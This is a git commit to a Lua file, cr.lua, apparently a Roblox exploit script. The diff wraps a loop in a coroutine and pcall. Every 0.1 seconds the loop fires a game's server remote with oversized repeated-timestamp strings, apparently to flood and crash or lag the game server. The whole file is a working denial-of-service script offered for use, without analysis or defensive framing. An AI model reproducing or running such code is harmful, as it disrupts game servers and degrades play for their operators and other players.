7aa5bca2ce58715910af9bb055f7fc59938f0742
0_L1 <92831976+ALWEB2@users.noreply.github.com>
2022-08-08 19:01:09 -0400

    Update cr.lua

--- cr.lua
+++ cr.lua
@@ -1,4 +1,10 @@
-while task.wait(0.1) do
+
+coroutine.resume(coroutine.create(function()
+       pcall(function()
+                    while task.wait(0.1) do
     workspace:WaitForChild("__THINGS"):WaitForChild("__REMOTES"):WaitForChild("MAIN"):FireServer("a",tostring(tick()):rep(100))
     workspace:WaitForChild("__THINGS"):WaitForChild("__REMOTES"):WaitForChild("MAIN"):FireServer("b",tostring(tick()):rep(100))
 end
+       end)
+end))
+
